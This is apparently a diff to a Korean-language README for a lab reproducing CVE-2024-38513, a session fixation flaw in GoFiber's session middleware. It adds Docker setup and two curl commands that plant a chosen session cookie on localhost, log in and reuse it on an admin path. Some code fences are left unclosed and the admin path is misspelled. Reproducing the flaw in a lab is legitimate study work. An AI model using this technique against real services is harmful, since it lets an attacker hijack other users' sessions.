@@ -1,5 +1,5 @@
 # Session Middleware Token Injection Vulnerability (CVE-2024-38513)
-- 취약점 유형: CWE-384 Session Fixation
+- 취약점 유형: CWE-384 (Session Fixation)
 - Version: GoFiber <=2.52.4
 
 ### 요약 
@@ -9,9 +9,20 @@ GoFiber의 세션 미들웨어는 클라이언트가 쿠키로 전달한 session
 
 ---
 
-
 ### 환경 설정 (Environment Setup)
 다음 명령어를 통해 GoFiber의 2.52.4 버전의 테스트 환경을 구축합니다.
 ```bash
-docker compose up -d 또는
-docker compose up --build
+docker compose up -d 또는docker compose up --build
+
+---
+
+### 취약점 재현 (Vulnerability Reproduction)
+공격자는 세션 ID를 사용해 로그인을 처리합니다.
+```bash
+curl -i -H "Cookie: session_id=attacker1234" http://localhost:3000/login
+
+동일한 세션으로 관리자 페이지에 요청을 보냅니다.
+```bash
+curl -i -H "Cookie: session_id=attacker1234" http://localhost:3000/admim
+
+앞에서 로그인된 attacker1234를 그대로 사용합니다. 
